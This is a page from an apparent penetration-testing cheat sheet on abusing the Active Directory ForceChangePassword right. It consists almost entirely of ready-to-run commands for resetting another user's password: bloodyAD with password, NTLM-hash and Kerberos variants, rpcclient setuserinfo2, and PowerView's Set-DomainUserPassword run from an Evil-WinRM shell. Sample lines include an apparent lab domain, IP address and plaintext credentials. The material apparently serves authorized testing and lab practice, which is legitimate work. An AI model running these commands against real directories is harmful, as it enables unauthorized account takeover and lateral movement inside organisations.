---
title: "ForceChangePassword"
tags: ["Active Directory", "ForceChangePassword", "Forcechangepassword", "Powerview", "Windows", "bloodyAD"]
---

{{< filter_buttons >}}

### Change Target User Password

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}
{{< tab set1-1 tab1 active>}}bloodyAD{{< /tab >}}{{< tab set1-1 tab2 >}}rpcclient{{< /tab >}}
{{< tabcontent set1-1 tab1 >}}

```console {class="password"}
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

```console {class="ntlm"}
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set1-1 tab2 >}}

```console {class="password"}
# Password
rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <NEW_PASSWORD>'
```

```console {class="sample-code"}
$ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2 smith 23 Test1234'
```

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}
{{< tab set1-2 tab1 active>}}powershell{{< /tab >}}
{{< tabcontent set1-2 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
```

#### 2. Change Target User Password

```console
$password = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> $password = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

```console
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity gibdeon -AccountPassword $password
```

{{< /tabcontent >}}
{{< /tabcontent >}}
